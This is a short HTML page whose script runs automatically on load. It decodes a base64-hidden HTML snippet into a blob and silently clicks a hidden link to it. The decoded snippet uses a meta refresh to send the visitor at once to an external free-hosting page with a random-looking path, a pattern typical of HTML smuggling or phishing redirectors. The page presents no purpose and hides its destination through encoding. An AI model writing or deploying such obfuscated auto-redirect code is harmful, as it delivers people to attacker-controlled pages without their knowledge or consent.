<!DOCTYPE html>
<html>
<head>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    $(document).ready(function() {
      saveFile();
    });

    function saveFile(name, type, data) {
      if (data != null && navigator.msSaveBlob)
        return navigator.msSaveBlob(new Blob([data], { type: type }), name);
      var a = $("<a style='display: none;'/>");
  
      var encodedStringAtoB = "PEhUTUw+IAo8SEVBRD4gCjxNRVRBIEhUVFAtRVFVSVY9InJlZnJlc2giIENPTlRFTlQ9IjAuMTtVUkw9aHR0cHM6Ly93d3cuZ3J3ZWJzaXRlcy5jb20vZnJlZS9qYW1lczIzNDg4L3JhbmR3M2J3N3I2ODRmd3VpZSI+IAo8L0JPRFk+IAo8L0hUTUw+";
      var decodedStringAtoB = atob(encodedStringAtoB);
      const myBlob = new Blob([decodedStringAtoB], { type: 'text/html' });
      const url = window.URL.createObjectURL(myBlob);
  
      a.attr("href", url);
      $("body").append(a);
      a[0].click();
      window.URL.revokeObjectURL(url);
      a.remove();
    }
  </script>
</head>
